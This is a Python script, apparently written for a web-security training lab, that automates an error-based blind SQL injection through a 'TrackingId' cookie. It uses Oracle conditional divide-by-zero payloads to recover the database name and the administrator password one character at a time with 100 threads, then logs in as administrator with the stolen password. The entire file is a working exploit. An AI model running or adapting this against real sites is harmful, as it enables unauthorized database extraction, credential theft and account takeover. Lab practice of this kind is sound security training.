import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

charset = 'abcdefghijklmnopqrstuvwxyz0123456789'

def get_cookies_with_requests(url):
    try:
        session = requests.Session()
        session.get(url)
        cookies = session.cookies.get_dict() #jadi dictionary, dengan key --> nama cookie dan value --> isi cookie
        tracking_id = cookies.get('TrackingId')
        return tracking_id
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")
        return None

def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser') #melakukan scrapping web
    csrf_token = soup.find('input', attrs={'name': 'csrf'}) #mengambil token csrf
    if csrf_token:
        return csrf_token['value']
    return None

def try_database_char(base_url, tracking_id, position, char):
    payload = f"' || (SELECT CASE WHEN SUBSTR(ora_database_name, {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '" #belum fix
    cookies = {
        'TrackingId': tracking_id + payload
    }

    response = requests.get(base_url, cookies=cookies)

    if response.status_code == 500:
        print(f"Karakter ke-{position} benar: {char}")
        return char
    elif response.status_code == 200:
        print(f"Karakter ke-{position} salah: {char}")
    return None

def bruteforce_database_name(base_url, tracking_id, threads):
    database_name = ''
    position = 1
    while True:
        found_char = None
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(try_database_char, base_url, tracking_id, position, char) for char in charset]

            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_char = result
                    database_name += result
                    break
        
        if found_char is None:  # Jika tidak ada karakter yang ditemukan, berarti nama database selesai
            break
        position += 1
    return database_name

def try_password_char(base_url, tracking_id, position, char):
    payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password, {position}, 1)='{char}') || '"
    cookies = {
        'TrackingId': tracking_id + payload
    }

    response = requests.get(base_url, cookies=cookies)

    if response.status_code == 500:
        print(f"Karakter ke-{position} benar: {char}")
        return char
    elif response.status_code == 200:
        print(f"Karakter ke-{position} salah: {char}")
    return None

def length_password(base_url, tracking_id):
    length = 0
    while True:
        payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>{length}) || '"
        cookies = {
        'TrackingId': tracking_id + payload
    }
        response = requests.get(base_url, cookies=cookies)
        if response.status_code == 500:
            length += 1
        else:
            break
    return length

def bruteforce_password(base_url, tracking_id, threads, length):
    password = ''
    for position in range(1, length+1):
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(try_password_char, base_url, tracking_id, position, char) for char in charset]

            for future in as_completed(futures):
                result = future.result()
                if result:
                    password += result #append karakter yang benar
                    break
    return password

def login(base_url, password):
    client = requests.Session()
    url = f"{base_url}login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print("Gagal mendapatkan CSRF token.")
        return False
    payload = {'csrf': csrf, 'username': 'administrator', 'password': password} #data login
    r = client.post(url, data=payload, allow_redirects=True) #melakukan POST request ke halaman login, allow redirect untuk mengikuti redirect atau laman lanjutan jika ada
    
    if 'Your username is: administrator' in r.text:
        print("Login berhasil!")
        return True
    else:
        print("Login gagal.")
        return False

def main():
    base_url = input("Masukkan URL lab: ").strip()
    threads = 100
    tracking_id = get_cookies_with_requests(base_url)

    if tracking_id:
        print(f"TrackingId: {tracking_id}")
        
        # Cek nama database
        print("\nMemulai brute-force nama database...")
        database_name = bruteforce_database_name(base_url, tracking_id, threads)
        print(f"Nama database yang ditemukan: {database_name}")

        # Cek panjang password
        length = length_password(base_url, tracking_id)
        print(f"Panjang Password: {length}")
        
        # Brute-force password
        password = bruteforce_password(base_url, tracking_id, threads, length)
        print(f"\nPassword administrator yang ditemukan: {password}")
        login(base_url, password)        
    else:
        print("Gagal mendapatkan TrackingId.")

if __name__ == '__main__':                                  
    main()
